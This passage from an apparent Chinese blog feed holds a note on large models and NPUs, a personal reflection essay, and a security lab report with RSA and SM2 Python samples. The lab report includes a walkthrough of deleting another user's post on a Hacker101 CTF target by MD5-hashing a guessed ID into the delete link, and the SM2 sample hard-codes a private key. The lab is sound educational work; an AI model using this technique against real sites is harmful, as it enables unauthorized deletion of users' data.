        <content type="html"><![CDATA[<h1 id="1-大模型概述"><a href="#1-大模型概述" class="headerlink" title="1 大模型概述"></a>1 大模型概述</h1><p><strong>大模型通常指的是具有庞大参数和复杂结构的机器学习模型。这些模型通过在大规模数据集上进行训练，能够学习到丰富的特征表示和复杂的映射关系。</strong> 大模型在众多领域都有广泛的应用，包括但不限于<a href="https://cloud.tencent.com/product/nlp?from_column=20065&from=20065" title="自然语言处理">自然语言处理</a>、计算机视觉、语音识别等。在自然语言处理领域，大模型可以用于文本分类、情感分析、<a href="https://cloud.tencent.com/product/tmt?from_column=20065&from=20065" title="机器翻译">机器翻译</a>等任务；在计算机视觉领域，大模型可以实现高质量的<a href="https://cloud.tencent.com/product/tiia?from_column=20065&from=20065" title="图像识别">图像识别</a>和生成；在语音识别领域，大模型可以准确地将语音信号转换为文本。<strong>而在深度学习中，大模型往往表现为深度神经网络，如卷积神经网络</strong>（CNN）、<strong>循环神经网络</strong>（RNN）和<strong>变换器</strong>（Transformer）等。</p><h2 id="1-1-大模型称为发展通用人工智能的重要途经"><a href="#1-1-大模型称为发展通用人工智能的重要途经" class="headerlink" title="1.1 大模型称为发展通用人工智能的重要途经"></a>1.1 大模型称为发展通用人工智能的重要途经</h2><p><img src="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%AC%94%E8%AE%B01/image_xMxj8iMrHT.png"></p><p>面向不同的需求，会有不同的模型。但是大模型可以使得一个模型解决多种任务，所以说通用大模型称为一个热点，是通往人工智能的一个关键途径。</p><h2 id="1-2-回归语言建模的本质"><a href="#1-2-回归语言建模的本质" class="headerlink" title="1.2 回归语言建模的本质"></a>1.2 回归语言建模的本质</h2><p>大模型本质上是在做语言建模，通过给定的文本，预测接下来的token。</p><p><img src="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%AC%94%E8%AE%B01/image_1ZLxUgBMZr.png"></p><h2 id="1-3-大模型的挑战与未来展望"><a href="#1-3-大模型的挑战与未来展望" class="headerlink" title="1.3 大模型的挑战与未来展望"></a>1.3 大模型的挑战与未来展望</h2><p>尽管大模型在机器学习领域取得了显著成果，但仍面临一些挑战。首先，大模型的训练需要大量的计算资源和时间，这使得其在实际应用中受到一定限制。其次，大模型可能存在过拟合和泛化能力较差的问题，需要采用合适的正则化技术和优化算法进行改进。</p><hr><h1 id="2-InternLM2技术报告要点"><a href="#2-InternLM2技术报告要点" class="headerlink" title="2 InternLM2技术报告要点"></a>2 InternLM2技术报告要点</h1><h2 id="2-1-InterEvo"><a href="#2-1-InterEvo" class="headerlink" title="2.1 InterEvo"></a>2.1 InterEvo</h2><p>InternEvo是一个开源的轻量级训练框架，旨在支持无需大量依赖关系的模型预训练。凭借单一代码库，InternEvo支持在具有上千GPU的大规模集群上进行预训练，并在单个GPU上进行微调，同时可实现显著的性能优化。当在1024个GPU上进行训练时，InternEvo可实现近90%的加速效率。</p><p>其中的文档提到了NPU，那么什么是NPU？</p><h2 id="2-2-NPU"><a href="#2-2-NPU" class="headerlink" title="2.2 NPU"></a>2.2 NPU</h2><blockquote><p><em>神经网络处理单元（NPU）是一种专门设计用于加速神经网络计算的处理器。与传统的中央处理单元（CPU）和图形处理单元（GPU）不同，NPU从硬件层面上针对AI计算进行了优化，以提高性能和能效。</em></p></blockquote><p><img src="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%AC%94%E8%AE%B01/image_kaeGfkwOr_.png"></p><p>NPU的工作原理是利用其专门设计的硬件结构来执行神经网络算法中的各种数学运算，如矩阵乘法、卷积等。这些运算是神经网络训练和推理过程中的核心操作。通过在硬件层面上进行优化，NPU能够以更低的能耗和更高的效率执行这些操作。</p><h2 id="2-3-NPU与CPU、GPU的不同"><a href="#2-3-NPU与CPU、GPU的不同" class="headerlink" title="2.3 NPU与CPU、GPU的不同"></a>2.3 NPU与CPU、GPU的不同</h2><p>CPU是通用处理器，设计用于执行广泛的计算任务。它具有强大的灵活性和可编程性，但可能在特定任务（如AI计算）上效率不高。</p><p>GPU最初设计用于处理图形和视频渲染，它擅长处理并行计算任务，因此在AI领域也得到了广泛应用。然而，GPU并非专门为AI计算设计，它在处理某些类型的AI任务时可能不如NPU高效。</p><p>简单来说，如下图，很容易说明三者不同：CPU是线性、串行任务（指令）执行，效率较低，通用性较高；GPU是并行处理和专用图形并行处理，效率更高；而NPU则是“并行认知处理”，在AI机器学习方面，效率更高。</p><p><img src="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%AC%94%E8%AE%B01/image_XY91NrWWnE.png"></p>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全实验1：数据的机密性</title>
      <link href="/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%AF%86%E6%80%A7/"/>
      <url>/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%AF%86%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1 实验环境"></a>1 实验环境</h1><ol><li>操作系统版本：Windows 11 家庭中文版23H2</li><li>Microsoft Edge版本：122.0.2365.92（正式版本）（64位）</li></ol><hr><h1 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2 实验内容"></a>2 实验内容</h1><h2 id="2-1-运行RSA加密程序，并进行改进"><a href="#2-1-运行RSA加密程序，并进行改进" class="headerlink" title="2.1 运行RSA加密程序，并进行改进"></a>2.1 运行RSA加密程序，并进行改进</h2><p>RSA加密是一种非对称加密算法，它使用了一对密钥：公钥和私钥。RSA加密的安全性基于一个数学难题，即大素数分解。这个算法是由Ron Rivest、Adi Shamir和Leonard Adleman在1977年提出的，他们姓氏的首字母组成了这个算法的名字。</p><p>RSA加密的安全性基于大数分解问题的难度，即在已知n的情况下，将其分解为p和q的乘积。目前，除非使用非常大的素数并且密钥长度足够长，否则RSA加密是相对安全的。RSA算法在信息安全领域广泛应用于数据加密、数字签名和密钥协商等方面。</p><p>代码2.1是Python语言的RSA加密程序。</p><p>代码清单2.1  RSA加密程序Python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># RSA加密  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsaEncryption</span>(<span class="params">public_key, cleartext</span>):  </span><br><span class="line">    result = rsa.encrypt(cleartext.encode(), public_key)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> base64.encodebytes(result)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># RSA解密  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsaDecryption</span>(<span class="params">private_key, ciphertext</span>):  </span><br><span class="line">    result = rsa.decrypt(base64.decodebytes(ciphertext), private_key)  </span><br><span class="line">    <span class="keyword">return</span> result.decode()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    <span class="comment"># 生成公钥与私钥  </span></span><br><span class="line">    public_key, private_key = rsa.newkeys(<span class="number">512</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 输出公钥、私钥  </span></span><br><span class="line">    <span class="built_in">print</span>(public_key.save_pkcs1())  </span><br><span class="line">    <span class="built_in">print</span>(private_key.save_pkcs1())  </span><br><span class="line">  </span><br><span class="line">    cleartext = <span class="built_in">input</span>(<span class="string">&quot;请输入明文:&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 使用公钥对明文进行加密  </span></span><br><span class="line">    ciphertext = rsaEncryption(public_key, cleartext)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密文：&quot;</span>, ciphertext)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 使用私钥对密文进行解密  </span></span><br><span class="line">    decipher = rsaDecryption(private_key, ciphertext)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;明文：&quot;</span>, decipher)</span><br></pre></td></tr></table></figure><p>首先，它导入了rsa和base64两个模块。然后，定义了两个函数rsaEncryption和rsaDecryption，分别用于RSA加密和解密操作。在main函数部分，程序生成了一对512位的RSA公钥和私钥，并将它们输出为PKCS#1格式。</p><p>接下来要求用户输入明文，并使用公钥对明文进行加密操作，加密了5次并打印出每次的密文。最后，程序使用私钥对最后一次加密的密文进行解密，并输出解密得到的明文。运行结果如图2.1所示。</p><p><img src="/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%AF%86%E6%80%A7/image_i7pJTI69Vd.png"></p><p>当对上述RSA加密算法继续改进时，其中一个改进的思路是增加密钥的长度，即由512位变成1024位。使用1024比512更长的密钥长度可以提供更高的安全性。密钥长度越长，RSA算法的安全性就越高，因为更长的密钥长度增加了破解密钥的难度。&#96;</p><h2 id="2-2-SM2国密算法"><a href="#2-2-SM2国密算法" class="headerlink" title="2.2 SM2国密算法"></a>2.2 SM2国密算法</h2><p>SM2是一种由中国国家密码管理局发布的椭圆曲线密码算法，属于非对称加密算法。它基于椭圆曲线离散对数难题（ECDLP），提供了数字签名、密钥交换、公钥加密等功能。与RSA相比，SM2具有更高的安全性和更好的性能。</p><p>SM2算法的基本流程包括密钥生成、加密、解密、签名和验证等步骤，通常使用特定的参数集和椭圆曲线方程。由于SM2算法是非对称加密算法，因此在使用过程中需要配对的公钥和私钥，公钥用于加密和验证，私钥用于解密和签名。</p><p>代码2.2是Python语言的SM2加密程序。</p><p>代码清单2.2  SM2加密程序Python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm2, func  </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--------------SM2加密--------------&#x27;</span>)  </span><br><span class="line">    <span class="comment"># 16进制的公钥和私钥  </span></span><br><span class="line">private_key = <span class="string">&#x27;00B9AB0B828FF68872F21A837FC3036684</span></span><br><span class="line"><span class="string">28DEA11DCD1B24429D0C99E24EED83D5&#x27;</span>  </span><br><span class="line">public_key = <span class="string">&#x27;B9C9A6E04E9C91F7BA880429273747</span></span><br><span class="line"><span class="string">D7EF5DDEB0BB2FF6317EB00BEF331A83081A6994B8993F3F5D</span></span><br><span class="line"><span class="string">6EADDDB81872266C87C018FB4162F5AF347B483E24620207&#x27;</span>  </span><br><span class="line">    sm2_crypt = sm2.CryptSM2(public_key=public_key, private_key=private_key)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 数据和加密后数据为bytes类型  </span></span><br><span class="line">    data = <span class="string">b&quot;xxxxx  xxxxx&quot;</span>  </span><br><span class="line">    enc_data = sm2_crypt.encrypt(data)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;加密后的数据：&#x27;</span>, enc_data)  </span><br><span class="line">    dec_data = sm2_crypt.decrypt(enc_data)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;解密后的数据：&#x27;</span>, dec_data)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 数字签名和验证  </span></span><br><span class="line">    data = <span class="string">b&quot;111&quot;</span>  <span class="comment"># bytes类型  </span></span><br><span class="line">    random_hex_str = func.random_hex(sm2_crypt.para_len)  </span><br><span class="line">    sign = sm2_crypt.sign(data, random_hex_str)  <span class="comment"># 16进制  </span></span><br><span class="line">    <span class="keyword">assert</span> sm2_crypt.verify(sign, data)  <span class="comment"># 16进制  </span></span><br></pre></td></tr></table></figure><p>SM2加密算法程序运行结果如图2.2所示。</p><p><img src="/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%AF%86%E6%80%A7/image_1_PDJG9BGDUO.png"></p><p>图2.2  SM2加密算法执行结果</p><h2 id="2-3-PostBook中越权删除帖子"><a href="#2-3-PostBook中越权删除帖子" class="headerlink" title="2.3 PostBook中越权删除帖子"></a>2.3 PostBook中越权删除帖子</h2><p>在PostBook中新建两个用户，注册两个用户，分别为userone和usertwo，之后在userone账户下创建两个帖子。如图2.3所示。</p><p><img src="/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%AF%86%E6%80%A7/image_2_Dr-YrQ59hv.png"></p><p>图2.3  用户一创建两个帖子</p><p>之后登录usertwo进行查看，如图2.4所示，可以看到在用户二中虽然能看到相关帖子，但是已经没有了“编辑”和“删除”权限。</p><p><img src="/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%AF%86%E6%80%A7/image_3_qIhEbwCdXI.png"></p><p>图2.4  用户二查看两个帖子</p><p>如图2.5，点开其中的一个帖子，并查看此时的url，可以看到在最后有一个“id&#x3D;4”，我们知道id一般是用来标志一个唯一的资源，所以可以猜测，帖子“userone’s post1”的id是4。</p><p><img src="/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%AF%86%E6%80%A7/image_4_edoP7RFizG.png"></p><p>图2.5  查看帖子1的url</p><p>之后，在用户二下创建一个帖子“usertow’s post”，如图2.6所示。</p><p><img src="/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%AF%86%E6%80%A7/image_5_hv1_JxSVPB.png"></p><p>图2.6  用户二创建帖子</p><p>如图2.7所示，可以看到刚刚创建的帖子的id字段值为7，之后将“删除”按钮的链接复制出来，即https:&#x2F;&#x2F;xxx.ctf.hacker101.com&#x2F;index.php?page&#x3D;delete.php&amp;id&#x3D; 8f14e45fceea167a5a36dedd4bea2543，可以看到在这里id并不是明文7，而是一串毫无规律的数字，所以推测应当是密文，这样我们就得到了一对明密文对。</p><p><img src="/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%AF%86%E6%80%A7/image_6__PtsKbXw9h.png"></p><p>图2.7  帖子“usertow’s post”的id</p><p>之后对上述明密文对所采用的加密方式进行猜测，在图2.8的MD5加密网站中输入明文“7”，对其进行加密得到的32位密文为“8f14e45fceea167a5a36dedd4bea2543”，可以发现就是当我们执行删除操作时对应的id的值，所以使用的加密方式是MD5。</p><p><img src="/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%AF%86%E6%80%A7/image_7_g-9sREk7Pp.png"></p><p>图2.8  MD5在线加密网站</p><p>在图2.4中，我们已经得到了用户一的一个帖子对应的明文id为4，使用MD5加密方式对4进行加密，得到密文“a87ff679a2f3e71d9181a67b7542122c”，现在把上面的删除链接中的id的值换成这个明文，并在浏览器中访问这个链接，结果如图2.9所示。</p><p><img src="/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9C%BA%E5%AF%86%E6%80%A7/image_8_Z2t0E45qu1.png"></p><p>图2.9  进行越权删除帖子</p><p>系统返回了一个提示信息，标志删除成功，并且可以看到此时用户一的帖子1已经没有了，所以说越权删除成功。</p><h2 id="2-4-替换MD5算法"><a href="#2-4-替换MD5算法" class="headerlink" title="2.4 替换MD5算法"></a>2.4 替换MD5算法</h2><p>MD5（Message Digest Algorithm 5）是一种哈希函数，用于产生128位（16字节）的散列值，通常用于对消息进行摘要或验证。然而，由于其设计上的一些弱点，MD5已经不再被推荐用于安全目的，正如内容2.3所示，MD5容易受到碰撞攻击和预图攻击的影响，从而导致安全性受到威胁。</p><p>因此想要提高系统的安全性，需要使用更安全的加密算法，例如使用SHA-256（Secure Hash Algorithm 256），SHA-256是SHA-2家族中的一种，产生256位（32字节）的哈希值。与MD5相比，SHA-256更安全，具有更高的抗碰撞性和预图攻击抵抗力。</p><hr><h1 id="3-实验总结"><a href="#3-实验总结" class="headerlink" title="3 实验总结"></a>3 实验总结</h1><p>在实验1中，我运行了RSA加密程序，并对其进行了改进以提升其安全性。RSA算法的优点是其安全性较高，基于大数因子分解的数学难题，使得其在当前情况下仍被广泛应用于加密通信中。但同时，RSA算法的缺点是其加解密速度较慢，在处理大量数据时性能表现不佳。</p><p>其次，在实验2中，我了解了国密算法（SM2）并将其应用于替换RSA加密。相比于RSA算法，SM2算法在性能上有一定的优势，尤其是在移动设备等资源受限的环境下表现更好。此外，SM2算法也具有较高的安全性，可以满足中国政府相关安全标准的要求。</p><p>在实验3中，我意识到了加密算法选择的重要性。由于使用了不安全的加密算法，可以对系统中的帖子进行越权删除，这暴露了系统安全性的严重问题。因此，在实践中，我们需要认真选择合适的加密算法，并严格控制系统的安全性，以防止类似漏洞的发生。</p><p>通过这些实验，我不仅学到了加密算法的原理和应用，还提高了对系统安全性的认识，为今后的安全工作打下了坚实的基础。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些杂谈</title>
      <link href="/2024/04/29/%E4%B8%80%E4%BA%9B%E6%9D%82%E8%B0%88/"/>
      <url>/2024/04/29/%E4%B8%80%E4%BA%9B%E6%9D%82%E8%B0%88/</url>
      
        <content type="html"><![CDATA[<p>最近是五一假期，放假7天，并且一些任务也完成了，所以才有时间写下这个内容。</p><h1 id="1-最近的一些感受"><a href="#1-最近的一些感受" class="headerlink" title="1 最近的一些感受"></a>1 最近的一些感受</h1><h2 id="1-1-关于截止时间的问题"><a href="#1-1-关于截止时间的问题" class="headerlink" title="1.1 关于截止时间的问题"></a>1.1 关于截止时间的问题</h2><p>在生活中，有很多任务等着我们去完成，相应的就有很多重要的时间结点等着我们，有的时间结点可能距离我们较远，有的距离我们较近，如果提前规划好这些任务是很重要的。我认为做一件事，最晚可能需要提前一个月做，这个是在你想把它做好的情况下。换个角度，也就是说如果你想在某一件事情上达到比较好的水平，至少需要一个月的时间。</p><p>另外做一件事情的最好时间是十年前，其次就是现在，这一点我颇有感悟，因为我最近发生了很多这样的事情：我之前没有做，但是当我发现这件事会带来正向影响，自那之后我就坚持做，并且最近我得到了收益。这种事情举例如下：</p><ol><li>学习强国：上学期有一个学习强国积分竞赛，但是由于我没怎么做，所以没有被选上，自那之后，每天都刷学习强国，现在我的总积分达到了22485，今年的学习己分达到了4910，并且在我们支部中是第一，第二分数为4811。虽然只相差100分，但是至少这100分我是花了时间的。</li><li>发展对象评选：也是上个学期，我积极分子已经满了一年，可以评选发展对象，但是由于要求班级思评必须前50%，而我68%，没有机会评选。自那之后，我加强了和班级同学的互动，并且在班级群里变得活跃，最终上个学期的思评达到了43%。这个学期的发展对象评选成功选上，也是完成了大学中的一个非常重要的计划。</li></ol><p>目前就这两件吧，但是这种思想要一直延续下去，如果发现有什么事情之前没有做，并且有价值，那么从现在开始坚持做下去，肯定会有一天，你会获得很大的收益。</p><p>在生活中遇到的小事情，能今天做就今天做，而不是拖到明天，因为明天还有明天的事情，有的时候你今天做完了，明天会感谢昨天的自己。</p><h2 id="1-2-提前提前提前做规划"><a href="#1-2-提前提前提前做规划" class="headerlink" title="1.2 提前提前提前做规划"></a>1.2 提前提前提前做规划</h2><p>最近发现，有的时候提前规划可能都不会解决问题，需要提前提前规划。比如保研需要机试，其实这个学期再准备也不晚，但是可能由于我个人的性格，还是感觉有些紧张。倘若我提前知道保研需要机试，那么我肯定会提前准备。这在另一种程序也可以说是信息差吧，如果我提前知道这个信息，肯定也会提前准备。所以解决这个问题的最好办法，就是提前提前规划。</p><p>最近半年内容事情已经确定会发生什么了，或者说已经会预知发生什么了，但是半年之后的事情呢，比如保研后的大四上学期，是不是还没有什么事情，那么我要提前规划未来会发生的事情，就比如未来我会找工作、写毕业论文，那么就可以提前做。</p><p>这种思想我觉得还是很重要的，但是现在肯定不晚，以后一定要将这种意识继续加强。</p><h2 id="1-3-学习留痕"><a href="#1-3-学习留痕" class="headerlink" title="1.3 学习留痕"></a>1.3 学习留痕</h2><p>关于留痕，我觉得这方面我做的还挺好，比较自豪的是一直使用wolai记录各个工作的内容，会写文档。在很多时候节省了我的很多时间，我觉得留痕最重要的目的是当你下次继续这个工作，或者说当你再捡起这个工作的时候，可以让你快速进入状态，而不是花费时间来做上次已经做过的工作。</p><p>并且留痕之后，更方便记录之前遇到的困难，但是也不能在留痕上花费很多时间。</p><h2 id="1-4-云服务"><a href="#1-4-云服务" class="headerlink" title="1.4 云服务"></a>1.4 云服务</h2><p>最近也是享受到了云服务的优势，例如正在使用的wolai笔记和wps云盘，真的特别方便，移动端和PC端同步访问一些问题，这也就把依赖的物理机给屏蔽了，随便给我一个电脑，我就可以找到我的文件，开始工作，并且代码我也上传到了github，之前并没有使用github，虽然当时没什么问题，但是后来项目完成之后，代码真的就不知道当时写了什么，而且代码都放在本地很占用空间，不如直接上传git。</p><p>现在我写什么代码，每天写完之后都会上传github，而不是最后再上传，这是一个好习惯，我应该一直保持下去。所以要继续发展“云”的思想，不要很依赖于我现在笔记本，github+wolai+wps我觉得已经能满足我全部的需求了，但是可能有时会有一些很大的文件，但是这种情况也是偶尔出现，我们应该把注意力放在最经常发生的事情上。</p><h2 id="1-5-提升自己的认知"><a href="#1-5-提升自己的认知" class="headerlink" title="1.5 提升自己的认知"></a>1.5 提升自己的认知</h2><p>那天在油管上看了一个视频，为什么普通人突破阶级很难，视频中说因为你的认知就是你的那个阶级的认知，还怎么跨越阶级？一开始没听懂，后来他说，如果你周围的人每天都刷手机，而你也每天刷，那你不就和他们一样吗？你应该不刷手机视频，多思考一些事情，专注于生活中的内容。我觉得他说的很有道理。</p><p>有些事情从小到大，可能在我们的潜意识中就会觉得这件事情就应该这么做，从来没有想过为什么不能那样做呢？就比如我最近想到，为什么一到放假，我的心态就会放松呢？为什么我就想玩呢？也不就是从小到大的一个潜意识吗：放假了就应该休息。但是放假我也可以继续认真学习的呀，甚至，我从内心就不区分假期和工作日。</p><p>所以，提升自己的认知，并且有些事情不要跟随自己的原始欲望，想要突破自己的格局，就要学会控制自己的欲望。其实，从现在开始，你不就在为自己未来的生活而努力吗？不就是为了提升自己的技能，找到工作吗？而不是仅仅把眼界放到研究生上，后面的事情一概不考虑。现在再遇到一些事情时，要多加思考吧，不要大家怎么做，我就怎么做。</p><h2 id="1-6-不要总想着某些事情浪费时间"><a href="#1-6-不要总想着某些事情浪费时间" class="headerlink" title="1.6 不要总想着某些事情浪费时间"></a>1.6 不要总想着某些事情浪费时间</h2><p>之前一直有一个毛病，但是我认为我会有那种想法也是正常的，因为我必须从那个阶段过来。所谓的毛病是：总想将时间利用率发挥到极致，也就是如果这个时间我可以理发，也可以学习，那么我一定要学习。而不是去理发，因为我之前的想法是理发的话，我就学不了习，就有些浪费时间。</p><p>但是这种想法完完全全是错误的，为什么我认为是错误的？就是因为这周，我专门抽出一半上午的时间去理发和拍证件照，如果是之前，我肯定是中午很短的时间去理发。但是那天，我拿出时间去理了，之后也没有感觉因为那个时间没有学习而浪费了什么，并且，感觉非常好，因为我完成了我一直拖欠的事情。</p><p>最近有些小感冒，如果是之前的自己可能会一直拖着，因为感觉去药店拿药会浪费时间，但是刚感冒的第二天就去了，拿药吃了之后感觉舒服了很多，并且现在感冒基本快好了，所以最近发生的这些事情让我愈发感觉到“不要总想着某些事情会浪费时间”，可能其他人并没有这种误区，但我认为我解决了一个重大的问题。</p><h2 id="1-7-对于生活中的事情从容不迫"><a href="#1-7-对于生活中的事情从容不迫" class="headerlink" title="1.7 对于生活中的事情从容不迫"></a>1.7 对于生活中的事情从容不迫</h2><p>生活本来就是什么都有可能发生，我们不能改变会到来什么，但是我们可以改变自己能改变的，比如自己的心情。生活中经常会发生不愉快的事情，但是如果和这些事情斤斤计较，肯定没完没了，并且会消耗自己的精力，倘若我们从上帝视角出发，生活中的一些事情，发生了就是发生了，不必过度纠结。继续向前走。</p><p>做一个情绪稳定，能给别人带来快乐的人，而不是让自己的坏情绪影响到他人。上周，就业指导课程每个小组需要选出来一个人上台进行模拟面试，我们小组选的我，我当时就感觉没有什么，不用担心。最终，我成功上台进行面试，虽然面试过程中也有些问题答不上来，但是这次面试经历带给我的成长远比简单的面试内容。我觉得我做得很棒，并且对于未来还未发生的事情，不要过度焦虑。</p><h2 id="1-8-不要沉迷于小成功"><a href="#1-8-不要沉迷于小成功" class="headerlink" title="1.8 不要沉迷于小成功"></a>1.8 不要沉迷于小成功</h2><p>生活中常有一些人夸赞我，有些时候我确实比较可以，但是不要被这种小喜悦给冲昏了头像，因为你毕竟还有你不会的内容。你还有很多要学习的，并且你学习的目的也不是为了得到他人的夸赞。所以没有必要因为xx夸你了就开心的不得了，也没有必要因为xx说你菜了而自卑。完全没有必要，当你不在乎这些，也就是所谓的功名，相信你的状态也会变得更好。</p><p>另外就是学习的过程中要保持自己的头脑清醒，有的时候其实我挺喜欢工作的，因为工作可以让我更加充实，如果你让我天天玩，我会感觉时间很慢，并且玩完了感觉内心空荡荡的。但是如果我的工作可以让我的某项技能得到提升，或者让我获得某个比较难获得的东西，我可能会很有成就感，并且心情很好，所以，按照自己的计划慢慢来就行，保持清醒，热爱生活，就是你最好的状态。</p><hr><h1 id="2-未来规划"><a href="#2-未来规划" class="headerlink" title="2 未来规划"></a>2 未来规划</h1><h2 id="2-1-大三下学期"><a href="#2-1-大三下学期" class="headerlink" title="2.1 大三下学期"></a>2.1 大三下学期</h2><p>这个学期最重要的还是准备保研吧，因为研究生还是挺重要的，并且准备和不准备最终去的院校还是有些差距的。在准备保研的同时还要关注就业，因为不管上研究生还是上什么最重要的是能找到一份好的工作，所以我要投递一些实习岗位，多了解有什么职位，以及薪资和需要的技能。</p><h2 id="2-2-大四上学期"><a href="#2-2-大四上学期" class="headerlink" title="2.2 大四上学期"></a>2.2 大四上学期</h2><p>这就是应用到我前面的提前提前规划，大四上学期，如果不去实习，就写毕业设计。如果去实习的话，可能就要认真实习。但是现在的想法还是不去实习，因为我想大四上学期完成毕业设计，并且学习一些目标岗位需要的技能。之后大四下学期去实习，并且也没有毕业设计任务了。</p>]]></content>
      
      
      <categories>
          
          <category> 思考总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录我的第一篇论文</title>
      <link href="/2024/01/28/%E8%AE%B0%E5%BD%95%E6%88%91%E7%9A%84%E8%AE%BA%E6%96%87%E5%A4%84%E5%A5%B3%E4%BD%9C/"/>
